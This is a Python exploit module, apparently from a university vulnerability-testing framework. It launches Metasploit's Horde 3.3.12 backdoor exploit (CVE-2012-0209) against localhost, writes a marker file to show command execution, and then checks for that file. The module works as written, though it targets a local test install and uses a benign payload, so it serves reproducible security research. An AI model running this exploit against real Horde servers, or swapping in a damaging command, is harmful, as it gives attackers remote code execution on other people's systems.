
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import os
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "CVE_2012_0209",
                  'Description' : "Horde 3.3.12 backdoor arbitrary PHP code execution. "
                                  "Horde 3.3.12 and Groupware 1.2.10 downloaded beetween "
                                  "November 2011 and February 2012 contain a backdoor "
                                  "which is accessed via a cookie supplied to open_calendar.js.",
                  'References' :  [['CVE', '2012-0209']],
                  'Target' :      "Horde 3.3.12",
                  'TargetLicense' : '',
                  'Type' :        'EXEC',
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
            
    def exploit(self):

        metasploit_cmd = "framework/Exploits/metasploit-framework/msfcli multi/http/horde_href_backdoor " \
                         "RHOST=127.0.0.1 URI=/horde/ PAYLOAD=cmd/unix/generic cmd='echo \"owned\" > "    \
                         "/var/www/horde/owned.txt' E"
        self.logger.info("Running Metasploit")
        os.system(metasploit_cmd)

        self.logger.info("Done! http://localhost/horde/owned.txt should now exist.")

        return


    def verify(self):
        verified = False
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/horde/owned.txt")

        if(driver.page_source.find("owned") != -1):
            self.logger.info("Command success")
            verified = True
        else:
            self.logger.info("Unable to verify payload execution")

        driver.cleanup()
        return verified
